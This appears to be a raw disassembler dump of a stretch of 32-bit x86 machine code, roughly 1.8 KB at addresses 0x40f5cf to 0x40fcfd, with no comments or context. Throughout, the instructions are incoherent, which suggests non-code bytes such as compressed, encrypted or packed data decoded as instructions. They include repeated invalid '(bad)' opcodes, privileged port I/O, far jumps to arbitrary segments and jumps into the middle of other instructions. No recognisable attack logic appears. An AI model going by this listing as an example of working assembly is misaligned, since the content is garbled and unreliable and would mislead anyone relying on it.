  40f5cf:	push   ebp
  40f5d0:	push   ebp
  40f5d1:	pop    esp
  40f5d2:	cmp    DWORD PTR [esi-0x21355abe],edx
  40f5d8:	pop    edi
  40f5d9:	lahf   
  40f5da:	pop    ebx
  40f5db:	sub    al,0x67
  40f5dd:	cmp    DWORD PTR fs:[ebx+0x31],esi
  40f5e1:	sbb    eax,0x3cbd0055
  40f5e6:	jp     0x40f637
  40f5e8:	lahf   
  40f5e9:	cmp    ch,BYTE PTR [ecx-0x65]
  40f5ec:	dec    edi
  40f5ed:	xlat   BYTE PTR ds:[ebx]
  40f5ee:	ret    0x230
  40f5f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f2:	loopne 0x40f5b0
  40f5f4:	rol    DWORD PTR [ebx+0x40cbae3],cl
  40f5fa:	xor    BYTE PTR [ecx],cl
  40f5fc:	mov    dh,0x7b
  40f5fe:	adc    ebp,DWORD PTR [ecx-0x16cfc548]
  40f604:	cld    
  40f605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f606:	cli    
  40f607:	es pop edx
  40f609:	out    0xc8,al
  40f60b:	jge    0x40f654
  40f60d:	mov    al,0x5e
  40f60f:	jo     0x40f64d
  40f611:	outs   dx,BYTE PTR ds:[esi]
  40f612:	call   0x74d693d6
  40f617:	lock shl ah,cl
  40f61a:	lods   eax,DWORD PTR ds:[esi]
  40f61b:	adc    DWORD PTR [edx+0x7],0xffffffe0
  40f61f:	(bad)  
  40f620:	fidiv  DWORD PTR [esi+0x54]
  40f623:	inc    esi
  40f624:	and    ebx,DWORD PTR [esi+0x40a87b35]
  40f62a:	mov    al,ds:0x71ed240d
  40f62f:	fild   WORD PTR [edi+ebx*4+0x48]
  40f633:	sbb    DWORD PTR [ebp+edx*1-0x37],esp
  40f637:	sbb    DWORD PTR [eax],edx
  40f639:	mov    al,0xac
  40f63b:	adc    DWORD PTR [esi],edx
  40f63d:	mov    esp,0x35d1071a
  40f642:	into   
  40f643:	repnz push es
  40f645:	mov    ds:0x50696299,al
  40f64a:	pop    es
  40f64b:	push   ds
  40f64c:	ror    ah,cl
  40f64e:	(bad)  
  40f64f:	jmp    0x40f63c
  40f651:	sbb    al,0xf0
  40f653:	inc    esp
  40f654:	pop    ecx
  40f655:	push   es
  40f656:	jmp    0x40f6bd
  40f658:	addr16 cmp edx,ebp
  40f65b:	cdq    
  40f65c:	and    eax,0x5835472
  40f661:	out    dx,al
  40f662:	inc    esi
  40f663:	aaa    
  40f664:	xor    BYTE PTR [edi+0x1142d03b],dh
  40f66a:	xchg   edi,eax
  40f66b:	nop
  40f66c:	pusha  
  40f66d:	xchg   edx,eax
  40f66e:	cs ret 
  40f670:	push   esi
  40f671:	xchg   ebp,eax
  40f672:	mov    dh,0x6a
  40f674:	enter  0x51f2,0x38
  40f678:	loopne 0x40f69a
  40f67a:	nop
  40f67b:	jae    0x40f622
  40f67d:	lock cs lahf 
  40f680:	lods   al,BYTE PTR ds:[esi]
  40f681:	push   edx
  40f682:	mov    DWORD PTR [eax-0x17d07aa5],esp
  40f688:	arpl   WORD PTR [ecx],ax
  40f68a:	cs pop edi
  40f68c:	jbe    0x40f637
  40f68e:	scas   eax,DWORD PTR es:[edi]
  40f68f:	aaa    
  40f690:	mov    ebp,0x2d9fdb34
  40f695:	test   BYTE PTR [edx],dh
  40f697:	push   esp
  40f698:	lahf   
  40f699:	(bad)  
  40f69a:	out    dx,eax
  40f69b:	mov    WORD PTR [eax-0x171c4295],cs
  40f6a1:	adc    BYTE PTR [ebp-0x40],0x72
  40f6a5:	push   0xdd8fe40e
  40f6aa:	pushf  
  40f6ab:	ret    
  40f6ac:	jecxz  0x40f67a
  40f6ae:	cmp    esi,eax
  40f6b0:	icebp  
  40f6b1:	push   0x76
  40f6b3:	or     ecx,DWORD PTR [ebx+ebx*4]
  40f6b6:	dec    ecx
  40f6b7:	inc    ebp
  40f6b8:	inc    ebp
  40f6b9:	in     eax,0x30
  40f6bb:	jp     0x40f6c9
  40f6bd:	xchg   ecx,eax
  40f6be:	popf   
  40f6bf:	or     ecx,DWORD PTR [edi]
  40f6c1:	jg     0x40f73d
  40f6c3:	mov    dl,0xcd
  40f6c5:	daa    
  40f6c6:	jb     0x40f71d
  40f6c8:	out    0xa3,al
  40f6ca:	push   esi
  40f6cb:	ins    DWORD PTR es:[edi],dx
  40f6cc:	and    bh,0xd2
  40f6cf:	inc    ebp
  40f6d0:	xor    DWORD PTR [ecx-0x29ca9c82],ecx
  40f6d6:	dec    ebp
  40f6d7:	and    BYTE PTR [ebp+0x3a],bl
  40f6da:	mov    BYTE PTR [edi+0xac23efe],ch
  40f6e0:	pop    ds
  40f6e1:	rcl    dh,cl
  40f6e3:	xchg   ebx,eax
  40f6e4:	scas   eax,DWORD PTR es:[edi]
  40f6e5:	adc    edx,DWORD PTR [ebp-0x217faa5]
  40f6eb:	ss loop 0x40f6da
  40f6ee:	scas   al,BYTE PTR es:[edi]
  40f6ef:	cmp    al,0xce
  40f6f1:	sbb    cl,BYTE PTR [edi+0x68453783]
  40f6f7:	in     al,dx
  40f6f8:	jmp    0x40f6e8
  40f6fa:	lods   eax,DWORD PTR ds:[esi]
  40f6fb:	sub    edx,DWORD PTR ds:0xc640abe5
  40f701:	cld    
  40f702:	(bad)  
  40f703:	sti    
  40f704:	push   ds
  40f705:	fld    QWORD PTR [ebp-0x30738185]
  40f70b:	je     0x40f75d
  40f70d:	and    eax,esi
  40f70f:	aam    0x8d
  40f711:	cs pop edi
  40f713:	push   0x4a7f16a8
  40f718:	cmp    ch,BYTE PTR [edx+0x35f51969]
  40f71e:	mov    ds:0x8901108c,al
  40f723:	loop   0x40f6cd
  40f725:	jb     0x40f75f
  40f727:	test   al,0xb6
  40f729:	adc    bl,BYTE PTR [edx+0x13]
  40f72c:	in     al,dx
  40f72d:	retf   0x22ab
  40f730:	in     al,dx
  40f731:	dec    esi
  40f732:	fadd   st(4),st
  40f734:	dec    ebx
  40f735:	jns    0x40f768
  40f737:	(bad)  
  40f738:	mov    ch,0x9f
  40f73a:	or     DWORD PTR [esi],esp
  40f73c:	lods   eax,DWORD PTR ds:[esi]
  40f73d:	xor    ebx,DWORD PTR [eax+0x32]
  40f740:	in     al,0x1c
  40f742:	sbb    ebx,DWORD PTR [edi+eax*8+0x4]
  40f746:	cmp    dh,BYTE PTR [edi]
  40f748:	inc    esi
  40f749:	and    al,0x72
  40f74b:	sub    al,0x49
  40f74d:	loop   0x40f6d8
  40f74f:	gs jmp 0xb719:0x4d73a431
  40f757:	in     al,0x22
  40f759:	jecxz  0x40f6e8
  40f75b:	mov    dh,0x6d
  40f75d:	aam    0x70
  40f75f:	clc    
  40f760:	adc    dl,BYTE PTR [ebx-0x5990db51]
  40f766:	or     eax,0x7e74d3f9
  40f76b:	xor    al,0x86
  40f76d:	jo     0x40f7c1
  40f76f:	(bad)  
  40f770:	and    DWORD PTR [ecx],edx
  40f772:	mov    esp,0x4fd97ed2
  40f777:	sbb    ecx,DWORD PTR [esi]
  40f779:	cs mov edi,0xe221730
  40f77f:	sahf   
  40f780:	(bad)
  40f783:	and    BYTE PTR [ebp+0x47],dh
  40f786:	jle    0x40f72c
  40f788:	inc    esi
  40f789:	ins    DWORD PTR es:[edi],dx
  40f78a:	cmp    edi,DWORD PTR [ecx]
  40f78c:	data16 mov bl,0x5a
  40f78f:	sar    BYTE PTR [edi],cl
  40f791:	shl    BYTE PTR [esi+edx*4+0x20a3f00f],1
  40f798:	iret   
  40f799:	or     al,0xd5
  40f79b:	add    esi,DWORD PTR es:[edi+ebp*1-0xaf83ff4]
  40f7a3:	dec    ebp
  40f7a4:	jl     0x40f759
  40f7a6:	and    DWORD PTR [ebx-0x2b8feb65],ebx
  40f7ac:	jne    0x40f807
  40f7ae:	xchg   esp,eax
  40f7af:	push   ebx
  40f7b0:	xor    DWORD PTR [edi],ecx
  40f7b2:	scas   al,BYTE PTR es:[edi]
  40f7b3:	(bad)  
  40f7b4:	in     al,0x69
  40f7b6:	cmp    al,0x88
  40f7b8:	inc    ebx
  40f7b9:	fidivr WORD PTR [ecx-0x4eba8835]
  40f7bf:	mov    bl,BYTE PTR [eax-0x37c0c02]
  40f7c5:	jns    0x40f785
  40f7c7:	sti    
  40f7c8:	mov    al,0x1c
  40f7ca:	int    0x89
  40f7cc:	ins    BYTE PTR es:[edi],dx
  40f7cd:	adc    edi,DWORD PTR [edx-0x66]
  40f7d0:	ins    BYTE PTR es:[edi],dx
  40f7d1:	xchg   ebx,eax
  40f7d2:	outs   dx,DWORD PTR ds:[esi]
  40f7d3:	inc    ebx
  40f7d4:	js     0x40f79d
  40f7d6:	(bad)  
  40f7d8:	retf   0x9808
  40f7db:	sub    eax,0x4e746cae
  40f7e0:	mov    esp,0xdd068937
  40f7e5:	in     al,0x1b
  40f7e7:	mov    eax,0x1012b3ae
  40f7ec:	ds dec ebx
  40f7ee:	ror    BYTE PTR [ecx-0x53],1
  40f7f1:	mov    esp,0x7ff79aeb
  40f7f6:	in     eax,dx
  40f7f7:	ins    BYTE PTR es:[edi],dx
  40f7f8:	jl     0x40f795
  40f7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7fb:	cmp    eax,0xc70ad64d
  40f800:	nop
  40f801:	pop    edi
  40f802:	lods   eax,DWORD PTR ds:[esi]
  40f803:	sub    edx,DWORD PTR [edi]
  40f805:	aad    0x9c
  40f807:	into   
  40f808:	xor    eax,0xfbc38e2
  40f80d:	jne    0x40f839
  40f80f:	scas   eax,DWORD PTR es:[edi]
  40f810:	shr    eax,cl
  40f812:	(bad)  
  40f813:	aam    0xb8
  40f815:	test   al,0xde
  40f817:	retf   0xfdea
  40f81a:	hlt    
  40f81b:	jno    0x40f887
  40f81d:	fwait
  40f81e:	mov    cs,WORD PTR [esi+0x63]
  40f821:	jae    0x40f88c
  40f823:	dec    edx
  40f824:	or     ecx,edx
  40f826:	push   esi
  40f827:	std    
  40f828:	ja     0x40f89f
  40f82a:	out    0xa5,eax
  40f82c:	pop    ebx
  40f82d:	pop    ss
  40f82e:	mov    edx,0x52c3534f
  40f833:	or     ebp,DWORD PTR [ecx-0x70e4d671]
  40f839:	test   DWORD PTR [eax],edx
  40f83b:	jnp    0x40f857
  40f83d:	es (bad) 
  40f83f:	sti    
  40f840:	daa    
  40f841:	retf   
  40f842:	aaa    
  40f843:	pop    ds
  40f844:	test   eax,0xaa926e9b
  40f849:	and    DWORD PTR [ecx-0x7a],ecx
  40f84c:	shl    BYTE PTR [eax-0x1a],0xe9
  40f850:	bnd je 0x40f8c3
  40f853:	xchg   DWORD PTR [ebx+ecx*2],edx
  40f856:	or     edi,DWORD PTR [ecx+0x7c507ade]
  40f85c:	mov    ah,0xda
  40f85e:	addr16 push eax
  40f860:	add    BYTE PTR [esp+eiz*4],cl
  40f863:	jno    0x40f8cc
  40f865:	xchg   edi,eax
  40f866:	stos   DWORD PTR es:[edi],eax
  40f867:	mov    ds:0x55a18c1d,eax
  40f86c:	pop    ebx
  40f86d:	rcr    DWORD PTR [edx-0x49],0xcf
  40f871:	rcr    BYTE PTR [eax+0x1a],0x88
  40f875:	int3   
  40f876:	pop    ebx
  40f877:	aas    
  40f878:	das    
  40f879:	mov    cl,0x6d
  40f87b:	fcomip st,st(0)
  40f87d:	mov    dl,BYTE PTR [ebp+0x43c98648]
  40f883:	jb     0x40f8f4
  40f885:	(bad)  
  40f886:	out    0x73,al
  40f888:	pop    ebp
  40f889:	imul   ebx,edi,0x2e3771c8
  40f88f:	dec    edx
  40f890:	xor    ecx,ebx
  40f892:	mov    edi,0x6b954d42
  40f897:	add    DWORD PTR [eax+0x7b07a3c0],0x48
  40f89e:	inc    ebx
  40f89f:	bnd jb 0x40f8b7
  40f8a2:	pop    ecx
  40f8a3:	aaa    
  40f8a4:	sar    BYTE PTR [edx],1
  40f8a6:	and    BYTE PTR [edx+0x5b],cl
  40f8a9:	jne    0x40f83c
  40f8ab:	sbb    ah,BYTE PTR [esi]
  40f8ad:	std    
  40f8ae:	aam    0x1c
  40f8b0:	fidivr DWORD PTR [ecx+ebx*1]
  40f8b3:	aaa    
  40f8b4:	jge    0x40f8d0
  40f8b6:	neg    BYTE PTR [ecx]
  40f8b8:	xchg   DWORD PTR [ebp+0x15],ebp
  40f8bb:	inc    ebp
  40f8bc:	push   cs
  40f8bd:	inc    ebx
  40f8be:	repz lds ecx,FWORD PTR ds:0x5104e88a
  40f8c5:	enter  0xb3b7,0x8b
  40f8c9:	rcl    BYTE PTR [edx],0xc9
  40f8cc:	mov    DWORD PTR [eax+0x6],edi
  40f8cf:	sbb    esi,DWORD PTR [bp+si+0x2db4]
  40f8d4:	ret    
  40f8d5:	aad    0x40
  40f8d7:	pavgb  mm4,QWORD PTR [ecx*4+0xda4118]
  40f8df:	jnp    0x40f8d0
  40f8e1:	adc    eax,0x4f09b3a3
  40f8e6:	ds pop ds
  40f8e8:	setne  BYTE PTR [edx-0x42bdeb1]
  40f8ef:	xchg   BYTE PTR [edi],bh
  40f8f1:	aam    0x90
  40f8f3:	cmp    BYTE PTR [ecx+edi*1-0x33],dh
  40f8f7:	mov    dh,0xba
  40f8f9:	ja     0x40f95c
  40f8fb:	je     0x40f8a4
  40f8fd:	lods   eax,DWORD PTR ds:[esi]
  40f8fe:	retf   0xe20b
  40f901:	push   ecx
  40f902:	out    dx,eax
  40f903:	or     DWORD PTR [ebp-0x6],0x88ac692d
  40f90a:	stos   BYTE PTR es:[edi],al
  40f90b:	shl    DWORD PTR [edx-0x49],0x14
  40f90f:	aam    0x39
  40f911:	xchg   ebx,eax
  40f912:	xor    eax,0xaf8aa4fe
  40f917:	seto   BYTE PTR [ebx-0x5e]
  40f91b:	test   eax,0xdc507eca
  40f920:	add    DWORD PTR [eax],eax
  40f922:	xor    DWORD PTR [esp+eiz*8],ebx
  40f925:	pop    ebx
  40f926:	test   DWORD PTR [esi+0x1a],edi
  40f929:	nop
  40f92a:	pop    DWORD PTR [ebp-0x477a91f4]
  40f930:	xchg   BYTE PTR [edi-0x14570c93],dh
  40f936:	xor    BYTE PTR [edx+0x61fb7257],bl
  40f93c:	repz sbb eax,0xcbc4620e
  40f942:	(bad)  
  40f943:	ficomp WORD PTR [ebp+0x4d]
  40f946:	test   DWORD PTR [edi-0x2ffa7adb],ecx
  40f94c:	sub    BYTE PTR ds:[ebp+0x32],al
  40f950:	fwait
  40f951:	mov    cl,0xd4
  40f953:	xchg   edi,eax
  40f954:	dec    edi
  40f955:	stc    
  40f956:	mov    dl,0x11
  40f958:	cmc    
  40f959:	in     eax,0x45
  40f95b:	out    dx,eax
  40f95c:	sub    ch,BYTE PTR [eax-0x7dc77688]
  40f962:	xor    dl,BYTE PTR [ebx+edx*4]
  40f965:	fst    st(6)
  40f967:	repz push 0x6ba09989
  40f96d:	inc    edx
  40f96e:	xchg   edi,eax
  40f96f:	int3   
  40f970:	xchg   esp,esi
  40f972:	dec    ecx
  40f973:	ret    
  40f974:	cmc    
  40f975:	es jg  0x40f9ca
  40f978:	xchg   ebp,eax
  40f979:	xchg   esp,eax
  40f97a:	mov    es,WORD PTR [esi+0x405fae98]
  40f980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f981:	data16 jecxz 0x40f9bd
  40f984:	jecxz  0x40f973
  40f986:	pop    edi
  40f987:	mov    ebp,0x79e269bf
  40f98c:	popf   
  40f98d:	jge    0x40f9f7
  40f98f:	call   0xb5d6:0xc470f2c7
  40f996:	daa    
  40f997:	adc    ecx,ebx
  40f999:	stc    
  40f99a:	aad    0x4f
  40f99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f99d:	loop   0x40fa14
  40f99f:	cmp    dl,BYTE PTR [eax]
  40f9a1:	inc    esp
  40f9a2:	pop    es
  40f9a3:	xchg   ecx,eax
  40f9a4:	stos   BYTE PTR es:[edi],al
  40f9a5:	int3   
  40f9a6:	clc    
  40f9a7:	pop    es
  40f9a8:	and    DWORD PTR [ecx],esp
  40f9aa:	retf   0xc9bc
  40f9ad:	imul   edx,DWORD PTR [esp+eiz*2+0x140813b0],0x35741d36
  40f9b8:	sbb    DWORD PTR cs:[esi-0x39],0xfffffff7
  40f9bd:	adc    DWORD PTR [edi],esp
  40f9bf:	retf   
  40f9c0:	push   edx
  40f9c1:	xchg   ebx,eax
  40f9c2:	and    al,0xe7
  40f9c4:	jbe    0x40fa45
  40f9c6:	and    BYTE PTR ds:0xe5de0bd,dh
  40f9cc:	inc    ecx
  40f9cd:	dec    edi
  40f9ce:	add    ebp,DWORD PTR [ecx]
  40f9d0:	cs and eax,0x168e0abd
  40f9d6:	jae    0x40f9c9
  40f9d8:	rol    DWORD PTR [ecx+0x63],1
  40f9db:	das    
  40f9dc:	sub    BYTE PTR [eax],ah
  40f9de:	es push cs
  40f9e0:	pop    ss
  40f9e1:	test   DWORD PTR [esi-0x3d],edx
  40f9e4:	and    BYTE PTR [ebx+0x4718962],al
  40f9ea:	int3   
  40f9eb:	outs   dx,DWORD PTR ds:[esi]
  40f9ec:	jne    0x40f988
  40f9ee:	add    DWORD PTR [edi+eax*4],0x927ade34
  40f9f5:	add    DWORD PTR [ebx],edi
  40f9f7:	pop    es
  40f9f8:	or     al,bl
  40f9fa:	and    DWORD PTR [esi],ebp
  40f9fc:	adc    cl,bl
  40f9fe:	fxch   st(3)
  40fa00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa01:	mov    ds:0xc1cc344,eax
  40fa06:	pop    edx
  40fa07:	add    ch,BYTE PTR [ebx-0x71]
  40fa0a:	sub    cl,BYTE PTR [edi-0x3c6e705c]
  40fa10:	aaa    
  40fa11:	lods   al,BYTE PTR ds:[esi]
  40fa12:	rol    DWORD PTR [ebx+0x22025d0c],1
  40fa18:	out    0x3e,al
  40fa1a:	sbb    eax,0x51f5c8a9
  40fa1f:	call   0xc18e:0xa4f9daec
  40fa26:	mov    ebx,0x6328f4c9
  40fa2b:	add    eax,0x206fbe7c
  40fa30:	cdq    
  40fa31:	push   esi
  40fa32:	cmp    eax,edx
  40fa34:	imul   edx,DWORD PTR [ecx-0x30],0x2e967101
  40fa3b:	mov    ch,0x6a
  40fa3d:	(bad)  
  40fa3e:	sbb    esi,DWORD PTR [edi]
  40fa40:	adc    ah,BYTE PTR [edi+0x5ac2a602]
  40fa46:	sbb    ch,BYTE PTR [ebp+0x1b]
  40fa49:	pop    ss
  40fa4a:	leave  
  40fa4b:	or     ebp,DWORD PTR [ebx-0x24]
  40fa4e:	mov    esp,0x6afe2e8b
  40fa53:	xchg   esp,esp
  40fa55:	xchg   edx,eax
  40fa56:	(bad)
  40fa59:	ficom  WORD PTR [ecx+0x4b]
  40fa5c:	push   cs
  40fa5d:	dec    ebx
  40fa5e:	sbb    DWORD PTR [edi+0x31d31a9c],ebx
  40fa64:	pushf  
  40fa65:	leave  
  40fa66:	xor    ebx,DWORD PTR [eax-0x5b]
  40fa69:	pop    esp
  40fa6a:	pusha  
  40fa6b:	into   
  40fa6c:	ins    BYTE PTR es:[edi],dx
  40fa6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6e:	arpl   WORD PTR ds:0x95ad8250,ax
  40fa74:	ret    0x605b
  40fa77:	sub    ebp,edx
  40fa79:	jo     0x40fa46
  40fa7b:	jp     0x40fa8a
  40fa7d:	rcl    DWORD PTR [eax+0xc69d54d],0x49
  40fa84:	mov    cl,0xcc
  40fa86:	imul   edx,DWORD PTR ds:0xebfbd6c2,0xc27ee649
  40fa90:	add    esi,DWORD PTR ds:0x26337583
  40fa96:	icebp  
  40fa97:	mov    DWORD PTR [ecx],edx
  40fa99:	sar    DWORD PTR [edx-0x72],1
  40fa9c:	push   edx
  40fa9d:	adc    bl,cl
  40fa9f:	dec    ecx
  40faa0:	mov    DWORD PTR [ebx-0x41f9cbfd],eax
  40faa6:	mov    edi,0x1ce45465
  40faab:	jp     0x40fadb
  40faad:	lods   eax,DWORD PTR ds:[esi]
  40faae:	and    eax,0x98bbbd21
  40fab3:	repz js 0x40fb2e
  40fab6:	pop    ebx
  40fab7:	pop    ds
  40fab8:	repnz mov dl,dl
  40fabb:	dec    eax
  40fabc:	mov    dl,0x36
  40fabe:	mov    al,ds:0xe6884a43
  40fac3:	mov    BYTE PTR [eax-0x4d31b64b],ah
  40fac9:	cli    
  40faca:	inc    eax
  40facb:	cld    
  40facc:	hlt    
  40facd:	xor    bl,al
  40facf:	sub    DWORD PTR [ecx+0x1e467558],esp
  40fad5:	inc    eax
  40fad6:	pop    edi
  40fad7:	fsubr  st(5),st
  40fad9:	cmp    al,0x41
  40fadb:	mov    esi,0x46292ce4
  40fae0:	out    0x93,eax
  40fae2:	call   0xae466666
  40fae7:	fs in  eax,0x58
  40faea:	inc    ecx
  40faeb:	ret    
  40faec:	add    dh,BYTE PTR [ebp-0x71f3b383]
  40faf2:	push   cs
  40faf3:	and    esp,DWORD PTR [ebp-0x57]
  40faf6:	sar    edi,0x7a
  40faf9:	lods   al,BYTE PTR ds:[esi]
  40fafa:	jnp    0x40fb59
  40fafc:	ret    0x96df
  40faff:	jmp    esi
  40fb01:	dec    ebx
  40fb02:	lock or ebp,DWORD PTR [edx+0x78]
  40fb06:	push   ds
  40fb07:	xchg   BYTE PTR [esi+ebx*8-0x19462621],dl
  40fb0e:	imul   ebx,DWORD PTR [edx+esi*4-0x44],0x66
  40fb13:	out    dx,eax
  40fb14:	hlt    
  40fb15:	sub    eax,0x8c4421d
  40fb1a:	push   esp
  40fb1b:	shl    BYTE PTR [ebp-0x13],0x11
  40fb1f:	pop    dx
  40fb21:	aas    
  40fb22:	lock push edx
  40fb24:	fmul   DWORD PTR [ebp-0x7c]
  40fb27:	test   al,0x68
  40fb29:	mov    ebp,0xe02e6cf5
  40fb2e:	sahf   
  40fb2f:	nop
  40fb30:	push   es
  40fb31:	mov    bh,0xd3
  40fb33:	aam    0x6e
  40fb35:	lods   al,BYTE PTR ds:[esi]
  40fb36:	sahf   
  40fb37:	imul   ebx,DWORD PTR [edx+0x348bfde3],0x6
  40fb3e:	pop    ds
  40fb3f:	fs aaa 
  40fb41:	int    0x95
  40fb43:	push   cs
  40fb44:	fs js  0x40fb58
  40fb47:	adc    al,0xb0
  40fb4a:	or     DWORD PTR [ecx+eax*8-0x5d],ecx
  40fb4e:	xchg   ebx,eax
  40fb4f:	or     bl,bh
  40fb51:	ficomp WORD PTR [esi]
  40fb53:	aam    0xfe
  40fb55:	and    ecx,DWORD PTR [ebp-0x6e]
  40fb58:	mov    edi,eax
  40fb5a:	in     al,dx
  40fb5b:	adc    eax,0xc0459be7
  40fb60:	sbb    ah,0xe1
  40fb63:	push   ds
  40fb64:	pop    ebp
  40fb65:	adc    DWORD PTR [edx-0x49c09d31],edi
  40fb6b:	and    al,0xad
  40fb6d:	xchg   esi,eax
  40fb6e:	bound  ecx,QWORD PTR [esi+0x3adc71ef]
  40fb74:	add    BYTE PTR [ebp+0x75294f8c],al
  40fb7a:	cmp    al,0xd3
  40fb7c:	push   es
  40fb7d:	adc    ah,0x60
  40fb80:	mov    ebp,0x73a07fb0
  40fb85:	in     eax,0xbc
  40fb87:	lahf   
  40fb88:	mov    ch,0xb7
  40fb8a:	(bad)  
  40fb8b:	(bad)  
  40fb8c:	iret   
  40fb8d:	dec    ebx
  40fb8e:	fdivr  QWORD PTR ds:0x423792cd
  40fb94:	test   eax,0x468d097
  40fb99:	and    DWORD PTR [ecx-0x20],ebx
  40fb9c:	outs   dx,DWORD PTR ds:[esi]
  40fb9d:	pop    eax
  40fb9e:	fucomip st,st(2)
  40fba0:	add    DWORD PTR [ebx+0x7d],eax
  40fba3:	ror    BYTE PTR [ecx],cl
  40fba5:	adc    eax,0x58224ffe
  40fbaa:	jecxz  0x40fb51
  40fbac:	xor    eax,0xfe145551
  40fbb1:	repz out dx,al
  40fbb3:	leave  
  40fbb4:	ficomp DWORD PTR [edx+0x246edfda]
  40fbba:	aas    
  40fbbb:	lea    ebx,[edx+0x505c46b7]
  40fbc1:	push   esi
  40fbc2:	stc    
  40fbc3:	gs xchg esi,esi
  40fbc6:	div    BYTE PTR [ebp+0x6]
  40fbc9:	mov    dh,0x7
  40fbcb:	pop    esi
  40fbcc:	aaa    
  40fbcd:	clc    
  40fbce:	ins    BYTE PTR es:[edi],dx
  40fbcf:	add    al,BYTE PTR [edx]
  40fbd1:	mov    esi,0xdee0fc91
  40fbd6:	fidivr DWORD PTR [eax-0x71a0e75d]
  40fbdc:	loopne 0x40fbf7
  40fbde:	jl     0x40fbb2
  40fbe0:	ins    BYTE PTR es:[edi],dx
  40fbe1:	dec    ebx
  40fbe2:	mov    ?,WORD PTR [ebx]
  40fbe4:	inc    edi
  40fbe5:	xchg   esp,eax
  40fbe6:	push   esi
  40fbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe8:	arpl   di,bx
  40fbea:	ds pop edi
  40fbec:	push   edx
  40fbed:	xchg   edx,eax
  40fbee:	hlt    
  40fbef:	mov    BYTE PTR [edi],cl
  40fbf1:	sub    ebp,DWORD PTR [edx]
  40fbf3:	and    DWORD PTR [ebx-0x3c63d711],eax
  40fbf9:	sbb    BYTE PTR [edx],cl
  40fbfb:	(bad)  
  40fbfc:	cmp    al,0x10
  40fbfe:	leave  
  40fbff:	cs push ss
  40fc01:	lock jns 0x40fc1e
  40fc04:	cdq    
  40fc05:	scas   eax,DWORD PTR es:[edi]
  40fc06:	add    eax,DWORD PTR [esi-0x39]
  40fc09:	sbb    ch,dh
  40fc0b:	or     eax,0xac0da1b4
  40fc10:	ins    BYTE PTR es:[edi],dx
  40fc11:	popf   
  40fc12:	scas   eax,DWORD PTR es:[edi]
  40fc13:	loop   0x40fc48
  40fc15:	pushf  
  40fc16:	int3   
  40fc17:	cmp    al,0xad
  40fc19:	mov    al,0x75
  40fc1b:	cdq    
  40fc1c:	push   0xffffffc3
  40fc1e:	jns    0x40fc53
  40fc20:	fist   WORD PTR [ecx+ebp*4]
  40fc23:	je     0x40fbdc
  40fc25:	jmp    0xee43:0x6058f6fa
  40fc2c:	pop    edx
  40fc2d:	call   0xa90d:0xb82e8412
  40fc34:	shl    DWORD PTR [ebx],0x82
  40fc37:	ror    DWORD PTR [eax],1
  40fc39:	mov    ebp,0xb84f4859
  40fc3e:	and    DWORD PTR [edx],esp
  40fc40:	pushf  
  40fc41:	adc    al,0xbe
  40fc43:	pop    edx
  40fc44:	sub    eax,0x7189ce4b
  40fc49:	nop
  40fc4a:	(bad)  
  40fc4b:	ficom  WORD PTR [ebp-0x6]
  40fc4e:	xor    DWORD PTR [esi],edx
  40fc50:	loop   0x40fbe0
  40fc52:	cs call 0x18d6:0xbbf04b53
  40fc5a:	xchg   edx,eax
  40fc5b:	loopne 0x40fc34
  40fc5d:	data16 loop 0x40fc19
  40fc60:	jge    0x40fc96
  40fc62:	sti    
  40fc63:	fstp   DWORD PTR [eax+ebp*8]
  40fc66:	enter  0xe4b3,0xc8
  40fc6a:	jmp    0x40fce1
  40fc6c:	mov    cs,WORD PTR [edx+0x15]
  40fc6f:	mov    esi,0x393ce2c0
  40fc74:	push   edi
  40fc75:	mov    WORD PTR [ebx-0x1f],ss
  40fc78:	fadd   QWORD PTR [eax-0x7695d829]
  40fc7e:	(bad)  
  40fc7f:	out    dx,al
  40fc80:	ds scas al,BYTE PTR es:[edi]
  40fc82:	add    eax,0x74971d0d
  40fc87:	sub    al,0x1a
  40fc89:	sbb    esi,edx
  40fc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc8c:	test   eax,0x276d8d16
  40fc91:	xor    eax,0x6cc57098
  40fc96:	xchg   esp,eax
  40fc97:	in     eax,dx
  40fc98:	fdiv   QWORD PTR [esi]
  40fc9a:	scas   eax,DWORD PTR es:[edi]
  40fc9b:	aas    
  40fc9c:	push   esp
  40fc9d:	(bad)  
  40fc9f:	pop    ecx
  40fca0:	push   ds
  40fca1:	xchg   edx,ebp
  40fca3:	sub    DWORD PTR ds:0xffea8eb9,ebx
  40fca9:	(bad)  
  40fcaa:	push   eax
  40fcab:	lods   al,BYTE PTR ds:[esi]
  40fcac:	ja     0x40fd06
  40fcae:	push   ss
  40fcaf:	pusha  
  40fcb0:	(bad)  
  40fcb1:	push   0xffffffab
  40fcb3:	lods   eax,DWORD PTR ds:[esi]
  40fcb4:	mov    bl,0x7f
  40fcb6:	ins    BYTE PTR es:[edi],dx
  40fcb7:	and    al,0x85
  40fcb9:	scas   eax,DWORD PTR es:[edi]
  40fcba:	mov    ebp,0xb445de84
  40fcbf:	sbb    BYTE PTR [eax],ah
  40fcc1:	push   es
  40fcc2:	imul   ebx,DWORD PTR [ebx*4+0x1a89f76a],0xffffff8f
  40fcca:	in     al,0x41
  40fccc:	pop    ss
  40fccd:	cmp    edi,DWORD PTR [ebx]
  40fccf:	ja     0x40fd3a
  40fcd1:	lods   eax,DWORD PTR ds:[esi]
  40fcd2:	test   BYTE PTR [ebp+ebp*8+0x5b],bh
  40fcd6:	xlat   BYTE PTR ds:[ebx]
  40fcd7:	enter  0xb93b,0x9e
  40fcdb:	std    
  40fcdc:	sti    
  40fcdd:	adc    BYTE PTR [esi+edi*4],bh
  40fce0:	sbb    ch,BYTE PTR [esi]
  40fce2:	push   ds
  40fce3:	call   0x1cb7:0xc1caae13
  40fcea:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40fcec:	repnz mov ebx,0x6bf2de81
  40fcf2:	mov    edx,0xfa16f78b
  40fcf7:	mov    ch,0xe8
  40fcf9:	test   al,0xbb
  40fcfb:	and    esp,esp
  40fcfd:	mov    al,0x9e
